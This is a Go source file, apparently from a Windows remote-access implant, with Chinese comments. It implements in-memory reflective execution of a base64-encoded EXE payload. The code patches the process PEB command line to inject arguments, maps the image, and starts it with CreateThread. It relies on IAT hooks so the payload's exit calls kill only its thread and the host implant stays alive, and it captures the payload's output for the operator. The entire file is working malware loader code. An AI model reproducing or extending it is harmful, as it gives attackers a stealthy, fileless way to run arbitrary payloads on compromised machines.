//go:build windows && !light

package main

import (
	"encoding/base64"
	"fmt"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 内存执行 EXE（含参数）—— 反射式映射 + 命令行参数注入。
//
// 与 loadDLLMem 共用反射加载管线（映射/重定位/导入表），差别在于：
//   - EXE 没有 DllMain 约定，入口点是 AddressOfEntryPoint，需要用 CreateThread 起线程；
//   - 控制台/GUI 程序的 CRT 启动代码通过 GetCommandLineA/W（读 PEB 里的
//     RTL_USER_PROCESS_PARAMETERS.CommandLine）拿参数，因此要把我们想传的
//     命令行**写回 PEB**，否则映进去的程序会拿到植入体自己的命令行。
//
// 已知限制（在返回信息里明确告知，不做静默降级）：
//   - 只能执行与植入体同架构的 EXE（32 位镜像无法进 64 位进程）；
//   - 不要把 Go 编译的 EXE 这样跑：宿主植入体也是 Go，两个 Go runtime 在同一进程里
//     互相踩（实测载荷 argv 正常拿到，但宿主随后崩溃）；
//   - 载荷自行退出（ExitProcess / RtlExitUserProcess / 对本进程的 TerminateProcess）
//     由 mexecguard_windows.go 在 IAT 层接管成"只退线程"：**宿主不再被带走**
//     （v1.4.0 S6 P0-2）。覆盖范围与明确不覆盖的情形见那个文件的头部注释；
//     拿不到覆盖的载荷（运行时解析 API 地址后裸调）仍会把宿主带走。
//   - stdout/stderr 由 mexecguard_windows.go 重定向到本进程管道并回传；
//     拿不到内容时结果里会明确写出原因，不会静默给空串。

// processBasicInformation 对应 PROCESS_BASIC_INFORMATION。
type processBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	UniqueProcessID              uintptr
	InheritedFromUniqueProcessID uintptr
}

// pebUnicodeString 对应 UNICODE_STRING。
type pebUnicodeString struct {
	Length        uint16
	MaximumLength uint16
	Buffer        *uint16
}

// pebParamsOffset 返回 PEB→ProcessParameters 与 ProcessParameters→CommandLine 的偏移。
// 偏移按 Windows 公开结构（x64: 0x20 / 0x70；x86: 0x10 / 0x40）。
func pebParamOffsets() (pebParams, cmdLine uintptr) {
	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
		return 0x20, 0x70
	}
	return 0x10, 0x40
}

// currentProcessParameters 取当前进程 PEB 里的 RTL_USER_PROCESS_PARAMETERS 地址。
func currentProcessParameters() (uintptr, error) {
	procNtQueryInformationProcess := resolveAPI("ntdll.dll", "NtQueryInformationProcess")
	if procNtQueryInformationProcess.resolved() == 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess 不可用")
	}
	var pbi processBasicInformation
	var ret uint32
	status, _, _ := procNtQueryInformationProcess.Call(
		uintptr(windows.CurrentProcess()),
		0, // ProcessBasicInformation
		uintptr(unsafe.Pointer(&pbi)),
		unsafe.Sizeof(pbi),
		uintptr(unsafe.Pointer(&ret)),
	)
	if status != 0 || pbi.PebBaseAddress == 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess 失败 (status=0x%x)", status)
	}
	pebParamsOff, _ := pebParamOffsets()
	params := *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + pebParamsOff))
	if params == 0 {
		return 0, fmt.Errorf("PEB.ProcessParameters 为空")
	}
	return params, nil
}

// patchProcessCommandLine 把 newCmd 写入当前进程 PEB 的命令行，返回恢复函数。
//
// 优先原地覆盖（省一次分配），超出原有 MaximumLength 时新分配一块并改指针。
// 调用方应在被执行的 EXE 线程结束后调用恢复函数，避免污染植入体自身的命令行。
func patchProcessCommandLine(newCmd string) (func(), error) {
	params, err := currentProcessParameters()
	if err != nil {
		return nil, err
	}
	_, cmdLineOff := pebParamOffsets()
	us := (*pebUnicodeString)(unsafe.Pointer(params + cmdLineOff))

	// 保存原值以便恢复
	origLen, origMax, origBuf := us.Length, us.MaximumLength, us.Buffer

	utf16 := syscall.StringToUTF16(newCmd) // 末尾带 NUL
	need := uint16((len(utf16) - 1) * 2)   // 不含 NUL 的长度（UNICODE_STRING.Length）

	var newBuf *uint16
	var allocated bool
	if origBuf != nil && origMax >= uint16(len(utf16)*2) {
		newBuf = origBuf
	} else {
		addr, aerr := windows.VirtualAlloc(0, uintptr(len(utf16)*2), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
		if aerr != nil {
			return nil, fmt.Errorf("分配命令行缓冲失败: %v", aerr)
		}
		newBuf = (*uint16)(unsafe.Pointer(addr))
		allocated = true
	}
	dst := unsafe.Slice(newBuf, len(utf16))
	copy(dst, utf16)

	us.Buffer = newBuf
	us.Length = need
	us.MaximumLength = uint16(len(utf16) * 2)

	restore := func() {
		us.Length = origLen
		us.MaximumLength = origMax
		us.Buffer = origBuf
		if allocated {
			_ = windows.VirtualFree(uintptr(unsafe.Pointer(newBuf)), 0, windows.MEM_RELEASE)
		}
	}
	return restore, nil
}

// 注：v1.3.4 那个"只改被映射镜像自身 IAT"的 redirectExitImports 已删除 ——
// 它拦不住 msvcrt/ucrtbase 内部的 ExitProcess（那走的是 CRT DLL 自己的 IAT），
// 而"main 返回"恰恰是最常见的收尾路径。现在统一由 mexecguard_windows.go 的
// guardArmImage 接管（镜像 IAT + 已加载模块 IAT 两层 + 回调里记录退出码），
// 判定与覆盖边界见那个文件的头部注释。
// runMappedImage 反射式内存执行 EXE，并把 args 作为命令行参数传入。
//
// imageName 作为 argv[0]（为空时用 "program.exe"）；waitMs > 0 时等待线程结束
// 并返回退出码，否则立即返回（程序继续在后台线程运行）。
//
// v1.4.0 S6 P0-2 起，本函数的返回信息里会带上三件事：
//  1. 退出拦截统计（镜像 IAT + 已加载模块 IAT 各改了几处）；
//  2. 载荷的退出调用有没有被拦成 ExitThread（拦住 = 宿主没掉线）；
//  3. 载荷的 stdout/stderr 原文（拿不到时写明原因，不给静默空串）。
func runMappedImage(dataB64, args, imageName string, waitMs int) (string, int32, string) {
	raw, err := base64.StdEncoding.DecodeString(dataB64)
	if err != nil {
		return "", -1, fmt.Sprintf("base64 decode failed: %v", err)
	}
	if len(raw) < 0x40 {
		return "", -1, "payload too small to be a PE"
	}
	// 架构校验：32/64 位镜像不能跨架构映射进当前进程
	if err := checkPEArchMatch(raw); err != nil {
		return "", -1, err.Error()
	}

	if imageName == "" {
		imageName = "program.exe"
	}
	cmdLine := `"` + imageName + `"`
	if args != "" {
		cmdLine += " " + args
	}

	// 先注入命令行，再映射执行（CRT 启动时读 PEB）
	restore, perr := patchProcessCommandLine(cmdLine)
	if perr != nil {
		guardTrace("runMappedImage: 命令行注入失败: %v", perr)
		// 参数注入失败不阻断执行：仅在无参场景下降级，带参场景明确报错
		if args == "" {
			restore = func() {}
		} else {
			return "", -1, fmt.Sprintf("无法注入命令行参数（%v）：内存执行 exe 需要 PEB 命令行补丁", perr)
		}
	} else {
		guardTrace("runMappedImage: 命令行已注入 PEB: %q", cmdLine)
	}

	base, info, err := mapImagePE(raw)
	if err != nil {
		restore()
		return "", -1, fmt.Sprintf("reflective load failed: %v", err)
	}
	if info.entryRVA == 0 {
		restore()
		return "", -1, "PE has no entry point"
	}
	entry := base + uintptr(info.entryRVA)
	guardTrace("runMappedImage: 映射完成 base=%#x entry=%#x size=%d", base, entry, info.sizeOfImage)

	// 退出拦截（v1.4.0 S6 P0-2）：把"载荷退出进程"在 IAT 层接管成"只退线程"。
	// 必须在 CreateThread 之前武装：载荷可能一进去就调 ExitProcess。
	exitCountBefore, _ := guardExitStats()
	imageHits, moduleHits := guardArmImage(base, info, "exe_mem")

	// stdout/stderr 重定向：同样必须在 CreateThread 之前完成 ——
	// 被执行镜像的 CRT 在首次使用 stdio 时通过 GetStdHandle 读走句柄。
	capture := guardBeginStdioCapture()
	guardTrace("runMappedImage: 输出捕获就绪 enable=%v note=%q", capture.enable, capture.note)

	procCreateThread := resolveAPI("kernel32.dll", "CreateThread")
	if procCreateThread.resolved() == 0 {
		capture.End(false)
		restore()
		return "", -1, "CreateThread 不可用"
	}
	var tid uint32
	hThread, _, callErr := procCreateThread.Call(0, 0, entry, 0, 0, uintptr(unsafe.Pointer(&tid)))
	if hThread == 0 {
		capture.End(false)
		restore()
		return "", -1, fmt.Sprintf("CreateThread 失败: %v", callErr)
	}
	guardMarkExecThread(tid)
	guardTrace("runMappedImage: 载荷线程已创建 tid=%d hThread=%#x", tid, hThread)

	result := fmt.Sprintf("EXE 已在内存中执行：基址 0x%x，入口 0x%x，线程 %d，命令行 %q（%d 字节镜像）\n%s",
		base, entry, tid, cmdLine, len(raw), guardPatchSummary(imageHits, moduleHits))

	if waitMs <= 0 {
		stdoutText, stderrText, capNote := capture.End(false)
		restore()
		return result + "\n[!] 未等待线程结束（wait_ms=0），程序在后台线程继续运行" +
			guardFormatCaptured(stdoutText, stderrText, capNote), 0, ""
	}

	// 等载荷线程结束。等待期间：载荷的 ExitProcess 会被 IAT 回调改写成 ExitThread，
	// 因此"程序正常收尾"不再等于"宿主进程结束"。
	procWait := resolveAPI("kernel32.dll", "WaitForSingleObject")
	threadDone := false
	if procWait.resolved() != 0 {
		start := time.Now()
		procWait.Call(hThread, uintptr(waitMs))
		threadDone = time.Since(start) < time.Duration(waitMs)*time.Millisecond
		if !threadDone {
			// 刚好在超时边界结束的情况：再非阻塞探一次，避免把"已完成"误报成"还在跑"
			if r, _, _ := procWait.Call(hThread, 0); r == 0 { // WAIT_OBJECT_0
				threadDone = true
			}
		}
	} else {
		time.Sleep(time.Duration(waitMs) * time.Millisecond)
	}

	var exitCode uint32
	if threadDone {
		if procGetExit := resolveAPI("kernel32.dll", "GetExitCodeThread"); procGetExit.resolved() != 0 {
			procGetExit.Call(hThread, uintptr(unsafe.Pointer(&exitCode)))
		}
	}
	stdoutText, stderrText, capNote := capture.End(threadDone)
	exitCountAfter, lastExit := guardExitStats()
	guardTrace("runMappedImage: 等待结束 threadDone=%v 退出码=%d 拦截计数 %d→%d stdout=%d字节 stderr=%d字节 note=%q",
		threadDone, int32(exitCode), exitCountBefore, exitCountAfter, len(stdoutText), len(stderrText), capNote)
	// 线程句柄不再需要：无论线程是否还在跑，关掉我们的引用都不影响它（避免句柄泄漏）。
	if procClose := resolveAPI("kernel32.dll", "CloseHandle"); procClose.resolved() != 0 {
		procClose.Call(hThread)
	}
	restore()

	out := result
	if threadDone {
		out += fmt.Sprintf("\n线程已结束，退出码 %d", int32(exitCode))
	} else {
		out += fmt.Sprintf("\n[!] 等待 %dms 超时，程序仍在后台线程运行（线程 %d）", waitMs, tid)
	}
	// 退出拦截现场：区分"真的拦到了载荷的退出调用"与"本次没观察到退出调用"。
	if exitCountAfter > exitCountBefore {
		out += fmt.Sprintf("\n[退出拦截] 载荷调用 %s(%d) 已被改写为 ExitThread：只结束载荷线程，宿主植入端**未退出**。",
			lastExit.via, lastExit.code)
	} else {
		out += "\n[退出拦截] 本次未观察到载荷调用 ExitProcess/RtlExitUserProcess/TerminateProcess(本进程)。"
	}
	out += guardFormatCaptured(stdoutText, stderrText, capNote)
	guardTrace("runMappedImage: 结果已生成（%d 字节），返回给任务 worker", len(out))
	return out, int32(exitCode), ""
}

// checkPEArchMatch 校验 PE 机器码与当前植入体架构一致。
func checkPEArchMatch(raw []byte) error {
	eLfanew := int(binary16(raw, 0x3C))
	if eLfanew <= 0 || eLfanew+6 > len(raw) {
		return fmt.Errorf("invalid PE header offset")
	}
	machine := binary16(raw, eLfanew+4)
	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
		if machine == 0x014c { // IMAGE_FILE_MACHINE_I386
			return fmt.Errorf("载荷是 32 位 PE，无法在 64 位植入体中内存执行（请用 32 位植入体或改用落地执行）")
		}
	} else if machine == 0x8664 { // IMAGE_FILE_MACHINE_AMD64
		return fmt.Errorf("载荷是 64 位 PE，无法在 32 位植入体中内存执行")
	}
	return nil
}

func binary16(b []byte, off int) uint16 {
	if off < 0 || off+2 > len(b) {
		return 0
	}
	return uint16(b[off]) | uint16(b[off+1])<<8
}
